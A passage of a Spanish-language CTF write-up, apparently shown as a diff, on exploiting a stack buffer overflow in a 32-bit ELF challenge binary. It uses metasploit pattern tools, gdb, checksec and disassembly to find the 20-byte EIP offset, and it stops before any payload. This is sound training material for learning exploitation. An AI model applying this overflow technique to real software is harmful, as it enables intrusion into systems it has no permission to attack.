@@ -1,0 +1,134 @@
+[EN]
+This time the programmer did a better job to hid his flag. But the problem still: It’s vulnerable. Can you obtain the flag?
+Send to 209.190.1.131 9003
+NOW WITH SECRET BONUS!
+
+[PT-BR]
+Dessa vez o programador caprichou um pouco mais na hora de esconder sua flag. O problema que continua vulneravel. Consegue extrair a flag?
+Envie para 209.190.1.131 9003
+AGORA COM BONUS SECRETO!
+Binario
+
+Aquí hay soluciones que me han ayudado a entender como había que resolver este reto:
+
+https://ctftime.org/task/3258
+Solución
+
+Es un archivo elf de 32 bits que "peta" al leer una cadena, el clásico buffer overflow. Para ver el offset, primero creamos un patrón con metasploit:
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Luego lo ejecutamos en gdb:
+
+gdb -q ./please-no<br>Voltron loaded.<br>Reading symbols from ./please-no...(no debugging symbols found)...done.
+>>> dashboard -output /dev/pts/1
+>>> r
+Starting program: /root/Documents/3DSCTF/please-no 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Program received signal SIGSEGV, Segmentation fault.
+Traceback (most recent call last):
+File "<string>", line 764, in lines
+File "<string>", line 127, in run
+gdb.error: No function contains program counter for selected frame.
+During handling of the above exception, another exception occurred:
+Traceback (most recent call last):
+File "<string>", line 249, in on_stop
+File "<string>", line 300, in build
+File "<string>", line 782, in lines
+gdb.MemoryError: Cannot access memory at address 0x37614136
+0x37614136 in ?? ()
+>>> quit
+
+Y por último calculamos el offset:
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 0x37614136
+[*] Exact match at offset 20
+
+Echemos un vistazo a las protecciones que tiene el binario:
+
+gdb -q ./please-no
+Reading symbols from ./please-no...(no debugging symbols found)...done.
+gdb-peda$ checksec 
+CANARY	: disabled
+FORTIFY	: disabled
+NX	: ENABLED
+PIE	: disabled
+RELRO	: Partial
+
+Como no podemos usar la pila para ejecutar un shellcode (NX enabled), echemos un vistazo al código ensamblador para ver si encontramos algo interesante:
+
+objdump -D intel -S please-no
+
+Si nos fijamos no tenemos una clásica función main, parece que nuestras funciones están escondidas en la sección .text
+
+Si lo analizamos con radare2 sí nos detecta la función main:
+
+main ();
+; var int local_8h @ esp+0x8
+; DATA XREF from 0x08048497 (entry0)
+0x08048710	; sub esp, 0x1c
+0x08048713	; lea eax, dword [esp + local_8h]
+0x08048717	; mov dword [esp], eax
+0x0804871a	; call sym.imp.gets
+0x0804871f	; xor eax, eax
+0x08048721	; add esp, 0x1c
+0x08048724	ret<br>
+
+Se puede ver claramente una llamada a la función gets (call sym.imp.gets).
+
+080483f0 <gets@plt>:
+80483f0:	ff 25 10 a0 04 08	jmp	DWORD PTR ds:0x804a010
+80483f6:	68 08 00 00 00		push	0x8
+80483fb:	e9 d0 ff ff ff		jmp	80483d
+
+También hay otras funciones interesantes:
+
+08048410 <strcat@plt>:
+8048410:	ff 25 18 a0 04 08	jmp	DWORD PTR ds:0x804a018
+8048416:	68 18 00 00 00		push	0x18
+804841b:	e9 b0 ff ff ff		jmp	80483d0 <printf@plt-0x10>
+
+08048440 <f_open@plt>:
+8048440:	ff 25 24 a0 04 08	jmp	DWORD PTR ds:0x804a024
+8048446:	68 30 00 00 00		push	0x30
+804844b:	e9 80 ff ff ff		jmp	80483d0 <printf@plt-0x10>
+
+Hagamos un poco de reversing con dbg para ver hacia donde apuntamos el EIP.
+
+Vemos que hay una línea en .text que llama a gets, este puede ser un buen sitio para poner un breakpoint.
+
+804871a:	e8 d1 fc ff ff		call	80483f0 <gets@plt>
+804871f:	31 c0			xor	eax,eax
+8048721:	83 c4 1c		add	esp,0x1c
+8048724:	c3			ret
+
+>>> br *0x804871f
+Breakpoint 1 at 0x804871f
+
+python -c "print 'A'*20"
+AAAAAAAAAAAAAAAAAAAA
+
+Ejecutamos el programa y vemos el estado de la pila después de meter 20 "A":
+
+>>> r
+Starting program: /root/Documents/3DSCTF/please-no 
+AAAAAAAAAAAAAAAAAAAA
+Breakpoint 1, 0x0804871f in ?? ()
+
+>>> x/32xw $esp
+0xbffff350	0xbffff358	0x0804824c	0x41414141	0x41414141
+0xbffff360	0x41414141	0x41414141	0x41414141	0xb7e13200 <--
+0xbffff370	0x00000001	0xbffff404	0xbffff40c	0x00000000
+
+La flecha, que corresponde con la posición de la pila 0xbffff36c, indica el valor que tendremos que sobrescribir para controlar el EIP.
+
+Recordar que aún nos quedan por ejecutar estas dos instrucciones de gets antes de ejecutar el return:
+
+804871f:	31 c0			xor	eax,eax
+8048721:	83 c4 1c		add	esp,0x1c
+8048724:	c3			ret
+
+Ya sabemos como controlar el EIP, pero ¿hacia donde lo apuntamos?
+
+
